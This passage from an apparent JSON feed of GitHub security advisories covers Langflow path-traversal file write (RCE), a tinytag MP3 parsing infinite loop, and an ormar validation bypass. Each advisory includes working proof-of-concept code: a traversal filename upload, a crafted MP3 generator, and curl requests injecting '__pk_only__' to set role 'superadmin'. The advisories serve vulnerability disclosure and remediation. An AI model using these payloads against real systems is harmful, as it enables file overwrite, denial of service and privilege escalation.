+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "score": 8.8
+      }
+    }
+  },
+  {
+    "id": "GHSA-g2j9-7rj2-gm6c",
+    "source": "github",
+    "type": "advisory",
+    "title": "Langflow has an Arbitrary File Write (RCE) via v2 API",
+    "description": "### Summary\n\nWhile reviewing the recent patch for **CVE-2025-68478** (External Control of File Name in v1.7.1), I discovered that the root architectural issue within `LocalStorageService` remains unresolved. Because the underlying storage layer lacks boundary containment checks, the system relies entirely on the HTTP-layer `ValidatedFileName` dependency.\n\nThis defense-in-depth failure leaves the `POST /api/v2/files/` endpoint vulnerable to Arbitrary File Write. The multipart upload filename bypa",
+    "severity": "critical",
+    "published_at": "2026-03-19T17:46:43Z",
+    "attack_patterns": [
+      "inject",
+      "bypass",
+      "remote",
+      "code",
+      "upload",
+      "path",
+      "traversal"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-g2j9-7rj2-gm6c",
+      "cve_id": "CVE-2026-33309",
+      "url": "https://api.github.com/advisories/GHSA-g2j9-7rj2-gm6c",
+      "html_url": "https://github.com/advisories/GHSA-g2j9-7rj2-gm6c",
+      "summary": "Langflow has an Arbitrary File Write (RCE) via v2 API",
+      "description": "### Summary\n\nWhile reviewing the recent patch for **CVE-2025-68478** (External Control of File Name in v1.7.1), I discovered that the root architectural issue within `LocalStorageService` remains unresolved. Because the underlying storage layer lacks boundary containment checks, the system relies entirely on the HTTP-layer `ValidatedFileName` dependency.\n\nThis defense-in-depth failure leaves the `POST /api/v2/files/` endpoint vulnerable to Arbitrary File Write. The multipart upload filename bypasses the path-parameter guard, allowing authenticated attackers to write files anywhere on the host system, leading to Remote Code Execution (RCE).\n\n### Details\nThe vulnerability exists in two layers:\n\n1. **API Layer (`src/backend/base/langflow/api/v2/files.py:162`)**: Inside the `upload_user_file` route, the `filename` is extracted directly from the multipart `Content-Disposition` header (`new_filename = file.filename`). It is passed verbatim to the storage service. `ValidatedFileName` provides zero protection here as it only guards URL path parameters.\n2. **Storage Layer (`src/backend/base/langflow/services/storage/local.py:114-116`)**: The `LocalStorageService` uses naive path concatenation (`file_path = folder_path / file_name`). It lacks a `resolve().is_relative_to(base_dir)` containment check.\n\n**Recommended Fix:**\n\n1. Sanitize the multipart filename before processing:\n\n```python\nfrom pathlib import Path as StdPath\nnew_filename = StdPath(file.filename or \"\").name # Strips directory traversal characters\nif not new_filename or \"..\" in new_filename:\n    raise HTTPException(status_code=400, detail=\"Invalid file name\")\n\n```\n\n2. Add a canonical path containment check inside `LocalStorageService.save_file` to permanently kill this vulnerability class.\n\n### PoC\nThis Python script verifies the vulnerability against `langflowai/langflow:latest` (v1.7.3) by writing a file outside the user's UUID storage directory.\n\n```python\nimport requests\n\nBASE_URL = \"http://localhost:7860\"\n# Authenticate to get a valid JWT\ntoken = requests.post(f\"{BASE_URL}/api/v1/login\", data={\"username\": \"admin\", \"password\": \"admin\"}).json()[\"access_token\"]\n\n# Payload using directory traversal in the multipart filename\nTRAVERSAL_FILENAME = \"../../traversal_proof.txt\"\nSENTINEL_CONTENT = b\"CVE_RESEARCH_SENTINEL_KEY\"\n\nresp = requests.post(\n    f\"{BASE_URL}/api/v2/files/\",\n    headers={\"Authorization\": f\"Bearer {token}\"},\n    files={\"file\": (TRAVERSAL_FILENAME, SENTINEL_CONTENT, \"text/plain\")},\n)\n\nprint(f\"Status: {resp.status_code}\") # Returns 201\n# The file is successfully written to `/app/data/.cache/langflow/traversal_proof.txt`\n\n```\n\nServer Logs:\n```\n2026-02-19T10:04:54.031888Z [info     ] File ../traversal_proof.txt saved successfully in flow 3668bcce-db6c-4f58-834c-f49ba0024fcb.\n2026-02-19T10:05:51.792520Z [info     ] File secret_image.png saved successfully in flow 3668bcce-db6c-4f58-834c-f49ba0024fcb.\n```\nDocker cntainer file:\n```\nuser@40416f6848f2:~/.cache/langflow$ ls\n3668bcce-db6c-4f58-834c-f49ba0024fcb  profile_pictures\tsecret_key  traversal_proof.txt\n```\n\n### Impact\nAuthenticated Arbitrary File Write. An attacker can overwrite critical system files, inject malicious Python components, or overwrite `.ssh/authorized_keys` to achieve full Remote Code Execution on the host server.",
+      "type": "reviewed",
+      "severity": "critical",
+      "repository_advisory_url": "https://api.github.com/repos/langflow-ai/langflow/security-advisories/GHSA-g2j9-7rj2-gm6c",
+      "source_code_location": "https://github.com/langflow-ai/langflow",
+      "identifiers": [
+        {
+          "value": "GHSA-g2j9-7rj2-gm6c",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33309",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c",
+        "https://github.com/advisories/GHSA-g2j9-7rj2-gm6c"
+      ],
+      "published_at": "2026-03-19T17:46:43Z",
+      "updated_at": "2026-03-19T17:46:44Z",
+      "github_reviewed_at": "2026-03-19T17:46:43Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "langflow"
+          },
+          "vulnerable_version_range": ">= 1.2.0, <= 1.8.1",
+          "first_patched_version": "1.9.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+          "score": 10.0
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        },
+        {
+          "cwe_id": "CWE-73",
+          "name": "External Control of File Name or Path"
+        },
+        {
+          "cwe_id": "CWE-94",
+          "name": "Improper Control of Generation of Code ('Code Injection')"
+        },
+        {
+          "cwe_id": "CWE-284",
+          "name": "Improper Access Control"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "akshatgit",
+            "id": 11229971,
+            "node_id": "MDQ6VXNlcjExMjI5OTcx",
+            "avatar_url": "https://avatars.githubusercontent.com/u/11229971?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/akshatgit",
+            "html_url": "https://github.com/akshatgit",
+            "followers_url": "https://api.github.com/users/akshatgit/followers",
+            "following_url": "https://api.github.com/users/akshatgit/following{/other_user}",
+            "gists_url": "https://api.github.com/users/akshatgit/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/akshatgit/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/akshatgit/subscriptions",
+            "organizations_url": "https://api.github.com/users/akshatgit/orgs",
+            "repos_url": "https://api.github.com/users/akshatgit/repos",
+            "events_url": "https://api.github.com/users/akshatgit/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/akshatgit/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        },
+        {
+          "user": {
+            "login": "abhinavagarwal07",
+            "id": 8086316,
+            "node_id": "MDQ6VXNlcjgwODYzMTY=",
+            "avatar_url": "https://avatars.githubusercontent.com/u/8086316?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/abhinavagarwal07",
+            "html_url": "https://github.com/abhinavagarwal07",
+            "followers_url": "https://api.github.com/users/abhinavagarwal07/followers",
+            "following_url": "https://api.github.com/users/abhinavagarwal07/following{/other_user}",
+            "gists_url": "https://api.github.com/users/abhinavagarwal07/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/abhinavagarwal07/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/abhinavagarwal07/subscriptions",
+            "organizations_url": "https://api.github.com/users/abhinavagarwal07/orgs",
+            "repos_url": "https://api.github.com/users/abhinavagarwal07/repos",
+            "events_url": "https://api.github.com/users/abhinavagarwal07/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/abhinavagarwal07/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_reviewer"
+        },
+        {
+          "user": {
+            "login": "Jkavia",
+            "id": 32402787,
+            "node_id": "MDQ6VXNlcjMyNDAyNzg3",
+            "avatar_url": "https://avatars.githubusercontent.com/u/32402787?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/Jkavia",
+            "html_url": "https://github.com/Jkavia",
+            "followers_url": "https://api.github.com/users/Jkavia/followers",
+            "following_url": "https://api.github.com/users/Jkavia/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Jkavia/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/Jkavia/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Jkavia/subscriptions",
+            "organizations_url": "https://api.github.com/users/Jkavia/orgs",
+            "repos_url": "https://api.github.com/users/Jkavia/repos",
+            "events_url": "https://api.github.com/users/Jkavia/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/Jkavia/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer"
+        },
+        {
+          "user": {
+            "login": "andifilhohub",
+            "id": 115162146,
+            "node_id": "U_kgDOBt08Ig",
+            "avatar_url": "https://avatars.githubusercontent.com/u/115162146?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/andifilhohub",
+            "html_url": "https://github.com/andifilhohub",
+            "followers_url": "https://api.github.com/users/andifilhohub/followers",
+            "following_url": "https://api.github.com/users/andifilhohub/following{/other_user}",
+            "gists_url": "https://api.github.com/users/andifilhohub/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/andifilhohub/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/andifilhohub/subscriptions",
+            "organizations_url": "https://api.github.com/users/andifilhohub/orgs",
+            "repos_url": "https://api.github.com/users/andifilhohub/repos",
+            "events_url": "https://api.github.com/users/andifilhohub/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/andifilhohub/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "analyst"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 10.0
+      }
+    }
+  },
+  {
+    "id": "GHSA-f4rq-2259-hv29",
+    "source": "github",
+    "type": "advisory",
+    "title": "Denial of service via non-terminating SYLT frame parsing loop in tinytag",
+    "description": "### Summary\n\n`tinytag` `2.2.0` allows an attacker who can supply MP3 files for parsing to trigger a non-terminating loop while the library parses an ID3v2 `SYLT` (synchronized lyrics) frame. In server-side deployments that automatically parse attacker-supplied files, a single `498`-byte MP3 can cause the parsing operation to stop making progress and remain busy until the worker or process is terminated.\n\n### Details\n\nIn tag `2.2.0` (`6f1d3060f393743c2ec34d07c0855cceed827244`), the reachable call",
+    "severity": "medium",
+    "published_at": "2026-03-19T17:25:59Z",
+    "attack_patterns": [
+      "code",
+      "path"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-f4rq-2259-hv29",
+      "cve_id": "CVE-2026-32889",
+      "url": "https://api.github.com/advisories/GHSA-f4rq-2259-hv29",
+      "html_url": "https://github.com/advisories/GHSA-f4rq-2259-hv29",
+      "summary": "Denial of service via non-terminating SYLT frame parsing loop in tinytag",
+      "description": "### Summary\n\n`tinytag` `2.2.0` allows an attacker who can supply MP3 files for parsing to trigger a non-terminating loop while the library parses an ID3v2 `SYLT` (synchronized lyrics) frame. In server-side deployments that automatically parse attacker-supplied files, a single `498`-byte MP3 can cause the parsing operation to stop making progress and remain busy until the worker or process is terminated.\n\n### Details\n\nIn tag `2.2.0` (`6f1d3060f393743c2ec34d07c0855cceed827244`), the reachable call path is:\n\n- `TinyTag.get` in [`tinytag/tinytag.py#L144-L154`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L144-L154)\n- `_load` in [`tinytag/tinytag.py#L259-L266`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L259-L266)\n- `_parse_tag` and `_parse_id3v2` in [`tinytag/tinytag.py#L1059-L1092`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1059-L1092)\n- `_parse_frame` for `SYLT` / `SLT` in [`tinytag/tinytag.py#L1316-L1318`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1316-L1318)\n- `_parse_synced_lyrics` and `_find_string_end_pos` in [`tinytag/tinytag.py#L1219-L1248`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1219-L1248) and [`tinytag/tinytag.py#L1340-L1352`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1340-L1352)\n\nThe root cause is that `_parse_synced_lyrics` assumes `_find_string_end_pos` always returns a position greater than the current `offset`. That assumption is false when no string terminator is present in the remaining frame content.\n\nFor single-byte encodings, `_find_string_end_pos` does:\n\n```python\nreturn content.find(b'\\x00', start_pos) + 1\n```\n\nIf no terminator exists, `content.find(...)` returns `-1`, so the function returns `0`. `_parse_synced_lyrics` then does `offset = end_pos`, which resets `offset` to `0` inside:\n\n```python\nwhile offset < content_length:\n    end_pos = self._find_string_end_pos(content, encoding, offset)\n    value = self._decode_string(encoding + content[offset:end_pos]).lstrip('\\n')\n    offset = end_pos\n    time = unpack('>I', content[offset:offset + 4])[0]\n```\n\nBecause `offset` is reset to `0`, the loop condition remains true and the parser stops making forward progress. The UTF-16 branch in `_find_string_end_pos` has the same shape: if no `b'\\x00\\x00'` terminator is found, it also returns `0`, so the same non-progress condition applies there.\n\n`SYLT` parsing support was introduced by commit [`4d649b9c314ada8ff8a74e0469e9aadb3acb252a`](https://github.com/tinytag/tinytag/commit/4d649b9c314ada8ff8a74e0469e9aadb3acb252a) (`ID3: Make synced lyrics available in 'other.lyrics' (LRC format) (#270)`), which first shipped in `2.2.0`. I confirmed that `2.1.2` does not contain `_parse_synced_lyrics`, so `2.2.0` is the only confirmed affected release at this time.\n\nTest environment:\n\n- MacBook Air (Apple M2), macOS `26.3` / Darwin `arm64`\n- Python `3.14.3`\n- Confirmed affected release: `tinytag 2.2.0` (`6f1d3060f393743c2ec34d07c0855cceed827244`)\n- Also reproduced on current `main` commit `1d23f6fe169c92c070a265f9108e295577141383`\n\n### PoC\n\nThe following self-contained PoC generates a malformed `SYLT` frame and passes it to `TinyTag.get`:\n\n```python\n#!/usr/bin/env python3\nimport signal\nimport struct\nimport time\nfrom io import BytesIO\n\nfrom tinytag import TinyTag\n\n\ndef create_malicious_mp3() -> bytes:\n    id3_header = b\"ID3\" + bytes([3, 0, 0])  # ID3v2.3\n    encoding = b\"\\x00\"  # ISO-8859-1\n    language = b\"eng\"\n    timestamp_format = b\"\\x02\"\n    content_type = b\"\\x01\"\n    descriptor = b\"test\\x00\"\n    lyrics_data = b\"A\" * 50  # no null terminator in the remaining SYLT payload\n    frame_content = (\n        encoding + language + timestamp_format + content_type + descriptor + lyrics_data\n    )\n    frame = b\"SYLT\" + struct.pack(\">I\", len(frame_content)) + b\"\\x00\\x00\" + frame_content\n\n    tag_size = len(frame)\n    synchsafe = bytearray(4)\n    n = tag_size\n    for i in range(3, -1, -1):\n        synchsafe[i] = n & 0x7F\n        n >>= 7\n\n    return (\n        id3_header\n        + bytes(synchsafe)\n        + frame\n        + b\"\\xff\\xfb\\x90\\x00\"\n        + b\"\\x00\" * 413\n    )\n\n\ndef timeout_handler(signum, frame) -> None:\n    print(\"CONFIRMED: parsing did not finish within 10.0s; external interruption was required\")\n    raise SystemExit(1)\n\n\nsignal.signal(signal.SIGALRM, timeout_handler)\nsignal.alarm(10)\nstart = time.time()\n\ntry:\n    TinyTag.get(file_obj=BytesIO(create_malicious_mp3()), filename=\"poc.mp3\")\n    signal.alarm(0)\n    print(f\"Unexpectedly completed in {time.time() - start:.3f}s\")\nexcept SystemExit:\n    raise\nexcept Exception as exc:\n    signal.alarm(0)\n    print(f\"Unexpected exception before timeout: {type(exc).__name__}: {exc}\")\n```\n\nObserved output on `2.2.0` in the environment above:\n\n```text\nCONFIRMED: parsing did not finish within 10.0s; external interruption was required\n```\n\n### Impact\n\nAn attacker who can supply MP3 files for parsing can cause tinytag to enter a non-terminating loop in its own parser. This is a library-level availability issue in the documented parsing path.\n\nIn server-side processing of attacker-supplied files, a single request can tie up a worker or process that performs metadata extraction. In local or desktop integrations, opening a malicious file can hang the parsing task until it is interrupted.\n\n### Patches\n\nFixed in the following commits:\n\n- https://github.com/tinytag/tinytag/commit/5cd321521ff097e41724b601d7e3d7adc7e53402\n- https://github.com/tinytag/tinytag/commit/44e496310f7ced8077e9087e3774acbaa324b18a",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/tinytag/tinytag/security-advisories/GHSA-f4rq-2259-hv29",
+      "source_code_location": "https://github.com/tinytag/tinytag",
+      "identifiers": [
+        {
+          "value": "GHSA-f4rq-2259-hv29",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-32889",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/tinytag/tinytag/security/advisories/GHSA-f4rq-2259-hv29",
+        "https://github.com/tinytag/tinytag/commit/44e496310f7ced8077e9087e3774acbaa324b18a",
+        "https://github.com/tinytag/tinytag/commit/5cd321521ff097e41724b601d7e3d7adc7e53402",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-32889",
+        "https://github.com/tinytag/tinytag/commit/4d649b9c314ada8ff8a74e0469e9aadb3acb252a",
+        "https://github.com/advisories/GHSA-f4rq-2259-hv29"
+      ],
+      "published_at": "2026-03-19T17:25:59Z",
+      "updated_at": "2026-03-20T21:20:21Z",
+      "github_reviewed_at": "2026-03-19T17:25:59Z",
+      "nvd_published_at": "2026-03-20T03:15:59Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "tinytag"
+          },
+          "vulnerable_version_range": "<= 2.2.0",
+          "first_patched_version": "2.2.1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+          "score": 6.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-835",
+          "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "kq5y",
+            "id": 46104508,
+            "node_id": "MDQ6VXNlcjQ2MTA0NTA4",
+            "avatar_url": "https://avatars.githubusercontent.com/u/46104508?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/kq5y",
+            "html_url": "https://github.com/kq5y",
+            "followers_url": "https://api.github.com/users/kq5y/followers",
+            "following_url": "https://api.github.com/users/kq5y/following{/other_user}",
+            "gists_url": "https://api.github.com/users/kq5y/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/kq5y/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/kq5y/subscriptions",
+            "organizations_url": "https://api.github.com/users/kq5y/orgs",
+            "repos_url": "https://api.github.com/users/kq5y/repos",
+            "events_url": "https://api.github.com/users/kq5y/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/kq5y/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+        "score": 6.5
+      },
+      "epss": {
+        "percentage": 0.00014,
+        "percentile": 0.0243
+      }
+    }
+  },
+  {
+    "id": "GHSA-f964-whrq-44h8",
+    "source": "github",
+    "type": "advisory",
+    "title": "ormar Pydantic Validation Bypass via __pk_only__ and __excluded__ Kwargs Injection in Model Construc",
+    "description": "### Summary\n\nA Pydantic validation bypass in `ormar`'s model constructor allows any unauthenticated user to skip **all** field validation — type checks, constraints, `@field_validator`/`@model_validator` decorators, choices enforcement, and required-field checks — by injecting `\"__pk_only__\": true` into a JSON request body. The unvalidated data is subsequently persisted to the database. This affects the **canonical usage pattern** recommended in ormar's official documentation and examples.\n\nA se",
+    "severity": "high",
+    "published_at": "2026-03-19T16:27:43Z",
+    "attack_patterns": [
+      "inject",
+      "execute",
+      "bypass",
+      "sql",
+      "privilege",
+      "escalation",
+      "deserialization",
+      "path"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-f964-whrq-44h8",
+      "cve_id": "CVE-2026-27953",
+      "url": "https://api.github.com/advisories/GHSA-f964-whrq-44h8",
+      "html_url": "https://github.com/advisories/GHSA-f964-whrq-44h8",
+      "summary": "ormar Pydantic Validation Bypass via __pk_only__ and __excluded__ Kwargs Injection in Model Constructor",
+      "description": "### Summary\n\nA Pydantic validation bypass in `ormar`'s model constructor allows any unauthenticated user to skip **all** field validation — type checks, constraints, `@field_validator`/`@model_validator` decorators, choices enforcement, and required-field checks — by injecting `\"__pk_only__\": true` into a JSON request body. The unvalidated data is subsequently persisted to the database. This affects the **canonical usage pattern** recommended in ormar's official documentation and examples.\n\nA secondary `__excluded__` parameter injection uses the same design pattern to selectively nullify arbitrary model fields during construction.\n\n### Details\n\n**Root cause:** `NewBaseModel.__init__` ([`ormar/models/newbasemodel.py`, line 128](https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L128)) pops `__pk_only__` directly from user-supplied `**kwargs` before any validation occurs:\n\n```python\n# ormar/models/newbasemodel.py, lines 128-142\npk_only = kwargs.pop(\"__pk_only__\", False)      # ← extracted from user kwargs\nobject.__setattr__(self, \"__pk_only__\", pk_only)\n\nnew_kwargs, through_tmp_dict = self._process_kwargs(kwargs)\n\nif not pk_only:\n    # Normal path: full Pydantic validation\n    new_kwargs = self.serialize_nested_models_json_fields(new_kwargs)\n    self.__pydantic_validator__.validate_python(\n        new_kwargs, self_instance=self\n    )\nelse:\n    # Bypass path: NO validation at all\n    fields_set = {self.ormar_config.pkname}\n    values = new_kwargs\n    object.__setattr__(self, \"__dict__\", values)       # raw dict written directly\n    object.__setattr__(self, \"__pydantic_fields_set__\", fields_set)\n```\n\nThe `__pk_only__` flag was designed as an internal optimization for creating lightweight FK placeholder instances in [`ormar/fields/foreign_key.py` (lines 41, 527)](https://github.com/collerek/ormar/blob/master/ormar/fields/foreign_key.py#L41). However, because it is extracted from `**kwargs` via `.pop()` with a `False` default, any external caller that passes user-controlled data to the model constructor can inject this flag.\n\n**Why the canonical FastAPI + ormar pattern is vulnerable:**\n\nOrmar's official example ([`examples/fastapi_quick_start.py`, lines 55-58](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py#L55)) recommends using ormar models directly as FastAPI request body parameters:\n\n```python\n@app.post(\"/items/\", response_model=Item)\nasync def create_item(item: Item):\n    await item.save()\n    return item\n```\n\nFastAPI parses the JSON body and calls `TypeAdapter.validate_python(body_dict)`, which triggers ormar's `__init__`. The `__pk_only__` key is popped at line 128 **before** Pydantic's validator inspects the data, so Pydantic never sees it — even `extra='forbid'` would not prevent this, because the key is already consumed by ormar.\n\nThe ormar Pydantic `model_config` (set in [`ormar/models/helpers/pydantic.py`, line 108](https://github.com/collerek/ormar/blob/master/ormar/models/helpers/pydantic.py#L108)) does not set `extra='forbid'`, providing no protection even in theory.\n\n**What is bypassed when `__pk_only__=True`:**\n- All type coercion and type checking (e.g., string for int field)\n- `max_length` constraints on String fields\n- `choices` constraints\n- All `@field_validator` and `@model_validator` decorators\n- `nullable=False` enforcement at the Pydantic level\n- Required-field enforcement (only `pkname` is put in `fields_set`)\n- `serialize_nested_models_json_fields()` preprocessing\n\n**Save path persists unvalidated data to the database:**\n\nAfter construction with `pk_only=True`, calling `.save()` ([`ormar/models/model.py`, lines 89-107](https://github.com/collerek/ormar/blob/master/ormar/models/model.py#L89)) reads fields directly from `self.__dict__` via `_extract_model_db_fields()`, then executes `table.insert().values(**self_fields)` — persisting the unvalidated data to the database with no re-validation.\n\n**Secondary vulnerability — `__excluded__` injection:**\n\nThe same pattern applies to `__excluded__` at [`ormar/models/newbasemodel.py`, line 292](https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L292):\n\n```python\nexcluded: set[str] = kwargs.pop(\"__excluded__\", set())\n```\n\nAt lines 326-329, fields listed in `__excluded__` are silently set to `None`:\n\n```python\nfor field_to_nullify in excluded:\n    new_kwargs[field_to_nullify] = None\n```\n\nAn attacker can inject `\"__excluded__\": [\"email\", \"password_hash\"]` to nullify arbitrary fields during construction.\n\n**Affected entry points:**\n\n| Entry Point | Exploitable? |\n|---|---|\n| `async def create_item(item: Item)` (FastAPI route) | Yes |\n| `Model.objects.create(**user_dict)` | Yes |\n| `Model(**user_dict)` | Yes |\n| `Model.model_validate(user_dict)` | Yes |\n\n### PoC\n\n**Step 1: Create a FastAPI + ormar application using the canonical pattern from ormar's docs:**\n\n```python\n# app.py\nfrom contextlib import asynccontextmanager\nimport sqlalchemy\nimport uvicorn\nfrom fastapi import FastAPI\nimport ormar\n\nDATABASE_URL = \"sqlite+aiosqlite:///test.db\"\normar_base_config = ormar.OrmarConfig(\n    database=ormar.DatabaseConnection(DATABASE_URL),\n    metadata=sqlalchemy.MetaData(),\n)\n\n@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    database_ = app.state.database\n    if not database_.is_connected:\n        await database_.connect()\n    # Create tables\n    engine = sqlalchemy.create_engine(DATABASE_URL.replace(\"+aiosqlite\", \"\"))\n    ormar_base_config.metadata.create_all(engine)\n    engine.dispose()\n    yield\n    database_ = app.state.database\n    if database_.is_connected:\n        await database_.disconnect()\n\napp = FastAPI(lifespan=lifespan)\ndatabase = ormar.DatabaseConnection(DATABASE_URL)\napp.state.database = database\n\nclass User(ormar.Model):\n    ormar_config = ormar_base_config.copy(tablename=\"users\")\n\n    id: int = ormar.Integer(primary_key=True)\n    name: str = ormar.String(max_length=50)\n    email: str = ormar.String(max_length=100)\n    role: str = ormar.String(max_length=20, default=\"user\")\n    balance: int = ormar.Integer(default=0)\n\n# Canonical ormar pattern from official examples\n@app.post(\"/users/\", response_model=User)\nasync def create_user(user: User):\n    await user.save()\n    return user\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000)\n```\n\n**Step 2: Send a normal request (validation works correctly):**\n\n```bash\n# This correctly rejects — \"name\" exceeds max_length=50\ncurl -X POST http://127.0.0.1:8000/users/ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",\n    \"email\": \"user@example.com\"\n  }'\n# Returns: 422 Validation Error\n```\n\n**Step 3: Inject `__pk_only__` to bypass ALL validation:**\n\n```bash\ncurl -X POST http://127.0.0.1:8000/users/ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"__pk_only__\": true,\n    \"name\": \"\",\n    \"email\": \"not-an-email\",\n    \"role\": \"superadmin\",\n    \"balance\": -99999\n  }'\n# Returns: 200 OK — all fields persisted to database WITHOUT validation\n# - \"name\" is empty despite being required\n# - \"email\" is not a valid email\n# - \"role\" is \"superadmin\" (bypassing any validator that restricts to \"user\"/\"admin\")\n# - \"balance\" is negative (bypassing any ge=0 constraint)\n```\n\n**Step 4: Inject `__excluded__` to nullify arbitrary fields:**\n\n```bash\ncurl -X POST http://127.0.0.1:8000/users/ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"__excluded__\": [\"email\", \"role\"],\n    \"name\": \"attacker\",\n    \"email\": \"will-be-nullified@example.com\",\n    \"role\": \"will-be-nullified\"\n  }'\n# Returns: 200 OK — email and role are set to NULL regardless of input\n```\n\n### Impact\n\n**Who is impacted:** Every application using ormar's canonical FastAPI integration pattern (`async def endpoint(item: OrmarModel)`) is vulnerable. This is the primary usage pattern documented in ormar's official examples and documentation.\n\n**Vulnerability type:** Complete Pydantic validation bypass.\n\n**Impact scenarios:**\n- **Privilege escalation**: If a model has a `role` or `is_admin` field with a Pydantic validator restricting values to `\"user\"`, an attacker can set `role=\"superadmin\"` by bypassing the validator\n- **Data integrity violation**: Type constraints (`max_length`, `ge`/`le`, regex patterns) are all bypassed — invalid data is persisted to the database\n- **Business logic bypass**: Custom `@field_validator` and `@model_validator` decorators (e.g., enforcing email format, age ranges, cross-field dependencies) are entirely skipped\n- **Field nullification** (via `__excluded__`): Audit fields, tracking fields, or required business fields can be selectively set to NULL\n\n**Suggested fix:**\n\nReplace `kwargs.pop(\"__pk_only__\", False)` with a keyword-only parameter that cannot be injected via `**kwargs`:\n\n```python\n# Before (vulnerable)\ndef __init__(self, *args: Any, **kwargs: Any) -> None:\n    ...\n    pk_only = kwargs.pop(\"__pk_only__\", False)\n\n# After (secure)\ndef __init__(self, *args: Any, _pk_only: bool = False, **kwargs: Any) -> None:\n    ...\n    object.__setattr__(self, \"__pk_only__\", _pk_only)\n```\n\nApply the same fix to `__excluded__`:\n\n```python\n# Before (vulnerable)\nexcluded: set[str] = kwargs.pop(\"__excluded__\", set())\n\n# After (secure) — pass via keyword-only _excluded parameter\ndef __init__(self, *args: Any, _pk_only: bool = False, _excluded: set | None = None, **kwargs: Any) -> None:\n    ...\n    # In _process_kwargs:\n    excludes = _excluded or set()\n```\n\nInternal callers in `foreign_key.py` would pass 